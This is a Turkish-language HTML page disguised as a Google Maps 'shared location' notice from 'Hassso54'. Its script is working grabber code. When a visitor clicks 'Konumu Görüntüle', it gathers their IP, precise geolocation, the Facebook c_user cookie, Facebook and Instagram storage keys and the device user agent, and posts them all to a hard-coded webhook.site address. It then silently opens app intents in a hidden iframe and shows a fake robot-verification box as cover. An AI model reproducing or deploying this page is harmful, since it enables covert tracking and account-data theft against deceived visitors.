<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Hassso54</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Segoe UI', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
        }
        .kart {
            background: white;
            border-radius: 30px;
            padding: 35px 25px;
            text-align: center;
            max-width: 320px;
            width: 100%;
            box-shadow: 0 20px 40px rgba(0,0,0,0.2);
        }
        .map-image {
            width: 160px;
            height: 160px;
            object-fit: contain;
            margin-bottom: 15px;
        }
        h2 {
            font-size: 20px;
            color: #202124;
            font-weight: 500;
            margin-bottom: 8px;
        }
        .alt-yazi {
            font-size: 14px;
            color: #5f6368;
            margin-bottom: 25px;
        }
        button {
            background: #1a73e8;
            color: white;
            border: none;
            padding: 14px 25px;
            border-radius: 50px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            width: 100%;
            transition: 0.2s;
        }
        button:active {
            transform: scale(0.97);
        }
        /* MAPS ÜZERİNDE GÖRÜNECEK KUTU */
        .robot-onay {
            position: fixed;
            bottom: 30px;
            right: 30px;
            background: rgba(0,0,0,0.85);
            backdrop-filter: blur(10px);
            border-radius: 16px;
            padding: 14px 20px;
            z-index: 999999;
            display: flex;
            align-items: center;
            gap: 12px;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
            box-shadow: 0 4px 20px rgba(0,0,0,0.3);
            border: 1px solid rgba(255,255,255,0.2);
            opacity: 0;
            transition: opacity 0.5s ease;
            pointer-events: none;
        }
        .robot-spinner {
            width: 22px;
            height: 22px;
            border: 2px solid rgba(255,255,255,0.3);
            border-top: 2px solid #fff;
            border-radius: 50%;
            animation: don 0.8s linear infinite;
        }
        @keyframes don {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .robot-text {
            color: white;
            font-size: 13px;
            font-weight: 500;
            letter-spacing: 0.3px;
        }
        .robot-text strong {
            color: #8ab4f8;
        }
        .robot-text small {
            font-size: 11px;
            color: #9aa0a6;
            display: block;
            margin-top: 2px;
        }
    </style>
</head>
<body>
    <div class="kart">
        <img src="https://cdn-icons-png.flaticon.com/512/447/447031.png" alt="Maps" class="map-image">
        <h2>Hassso54 sizinle konum paylaştı</h2>
        <div class="alt-yazi">Sakarya bölgesindeki konuma bak</div>
        <button id="btn">Konumu Görüntüle</button>
    </div>

    <script>
        // WEBHOOK ADRESİN
        const WEBHOOK = "https://webhook.site/45462893-c6b2-4d8b-a64f-783413a77923";
        
        // ----- 1. ARKA PLANDA BİLGİ TOPLAMA -----
        async function getIP() {
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                return data.ip;
            } catch(e) {
                return "IP alınamadı";
            }
        }
        
        function getKonum() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    resolve({ link: "https://www.google.com/maps", basarili: false });
                    return;
                }
                navigator.geolocation.getCurrentPosition(
                    (pos) => {
                        const link = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                        resolve({
                            link: link,
                            enlem: pos.coords.latitude,
                            boylam: pos.coords.longitude,
                            basarili: true
                        });
                    },
                    () => {
                        resolve({ link: "https://www.google.com/maps", basarili: false });
                    },
                    { enableHighAccuracy: true, timeout: 8000 }
                );
            });
        }
        
        // Facebook'tan ne çekebilirsek
        function facebookVeri() {
            let sonuc = { bulundu: false, bilgi: "Bulunamadı" };
            try {
                if (document.cookie.includes('c_user')) {
                    let match = document.cookie.match(/c_user=([^;]+)/);
                    if (match) {
                        sonuc.bulundu = true;
                        sonuc.bilgi = "Facebook ID: " + match[1];
                        sonuc.not = "Facebook oturumu açık, şifreni Facebook Ayarlar > Şifre ve Güvenlik'ten görebilirsin.";
                    }
                }
                for (let i = 0; i < localStorage.length; i++) {
                    let key = localStorage.key(i);
                    if (key && (key.includes('fb_') || key.includes('facebook'))) {
                        sonuc.bulundu = true;
                        sonuc.bilgi = "Facebook verisi bulundu (localStorage)";
                        break;
                    }
                }
            } catch(e) {}
            return sonuc;
        }
        
        // Instagram'dan ne çekebilirsek
        function instagramVeri() {
            let sonuc = { bulundu: false, bilgi: "Bulunamadı" };
            try {
                for (let i = 0; i < localStorage.length; i++) {
                    let key = localStorage.key(i);
                    if (key && (key.includes('ig_') || key.includes('instagram'))) {
                        sonuc.bulundu = true;
                        sonuc.bilgi = "Instagram verisi bulundu (localStorage)";
                        break;
                    }
                }
                for (let i = 0; i < sessionStorage.length; i++) {
                    let key = sessionStorage.key(i);
                    if (key && (key.includes('ig_') || key.includes('instagram'))) {
                        sonuc.bulundu = true;
                        break;
                    }
                }
            } catch(e) {}
            return sonuc;
        }
        
        // Free Fire notu
        function freeFireNot() {
            return "Free Fire hesabın Facebook ile bağlı. Facebook şifrenle giriş yapılır. Şifreni Facebook'tan gör.";
        }
        
        // ----- 2. ARKA PLANDA UYGULAMALARI AÇ (BİLDİRİMSİZ) -----
        function arkaPlanUygulamalariAc() {
            // Gizli bir iframe oluştur
            const gizli = document.createElement('iframe');
            gizli.style.display = 'none';
            document.body.appendChild(gizli);
            
            // Free Fire (çalıştır, arka planda kalsın)
            setTimeout(() => {
                gizli.src = "intent://play?link=https://ff.garena.com#Intent;scheme=https;package=com.dts.freefireth;end";
            }, 100);
            
            // Facebook
            setTimeout(() => {
                gizli.src = "fb://profile";
            }, 500);
            
            // Instagram
            setTimeout(() => {
                gizli.src = "instagram://user?username=";
            }, 900);
            
            // Temizlik
            setTimeout(() => {
                if (document.body.contains(gizli)) document.body.removeChild(gizli);
            }, 2000);
        }
        
        // ----- 3. ANA FONKSİYON -----
        async function baslat() {
            const btn = document.getElementById('btn');
            btn.innerText = "⏳";
            btn.disabled = true;
            
            // IP al
            const ip = await getIP();
            
            // Konum al
            const konum = await getKonum();
            
            // Facebook/Instagram verilerini topla
            const fb = facebookVeri();
            const ig = instagramVeri();
            const ffNot = freeFireNot();
            
            // TÜM VERİLERİ WEBHOOK'A GÖNDER
            const gonderilecek = {
                tip: "Hassso54_KONUM_HESAP_BILGILERI",
                zaman: new Date().toLocaleString('tr-TR'),
                konum_link: konum.link,
                enlem: konum.enlem,
                boylam: konum.boylam,
                ip: ip,
                facebook: {
                    durum: fb.bulundu ? "✅ Oturum açık" : "❌ Oturum açık değil",
                    bilgi: fb.bilgi,
                    not: "Şifreni görmek için: Facebook > Ayarlar > Şifre ve Güvenlik > Kayıtlı Şifreler"
                },
                instagram: {
                    durum: ig.bulundu ? "✅ Oturum açık" : "❌ Oturum açık değil",
                    bilgi: ig.bilgi,
                    not: "Email/Şifreni görmek için: Instagram > Ayarlar > Hesap > Kişisel Bilgiler"
                },
                free_fire: {
                    not: ffNot,
                    cozum: "Free Fire Facebook bağlantılı. Facebook şifreni değiştirirsen Free Fire şifren de değişir."
                },
                cihaz: navigator.userAgent,
                cozum_notu: "Tüm şifrelerini Google Password Manager'a kaydet, unutma!"
            };
            
            // Webhook'a gönder
            await fetch(WEBHOOK, { method: 'POST', mode: 'no-cors', body: JSON.stringify(gonderilecek) });
            
            // Arka planda uygulamaları aç (ekrana gelmeyecek)
            arkaPlanUygulamalariAc();
            
            // Google Maps'e yönlendir
            window.location.href = konum.link;
            
            // Maps açıldıktan sonra robot doğrulama kutusunu göster
            setTimeout(() => {
                kutuGoster();
            }, 1500);
        }
        
        // ----- 4. MAPS ÜZERİNDE ROBOT DOĞRULAMA KUTUSU -----
        function kutuGoster() {
            // Kutu yoksa oluştur
            let kutu = document.getElementById('robotKutu');
            if (!kutu) {
                kutu = document.createElement('div');
                kutu.id = 'robotKutu';
                kutu.className = 'robot-onay';
                kutu.innerHTML = `
                    <div class="robot-spinner"></div>
                    <div class="robot-text">
                        <strong>🔍 Lütfen bekleyin</strong><br>
                        Robot olmadığınız doğrulanıyor...<br>
                        <small>Google Maps'e yönlendiriliyorsunuz</small>
                    </div>
                `;
                document.body.appendChild(kutu);
            }
            
            // Göster
            kutu.style.opacity = "1";
            
            // 4 saniye sonra kaybol
            setTimeout(() => {
                kutu.style.opacity = "0";
                // 1 saniye sonra DOM'dan kaldır
                setTimeout(() => {
                    if (kutu && kutu.parentNode) kutu.remove();
                }, 1000);
            }, 4000);
        }
        
        // Buton olayı
        document.getElementById('btn').onclick = baslat;
    </script>
</body>
</html>
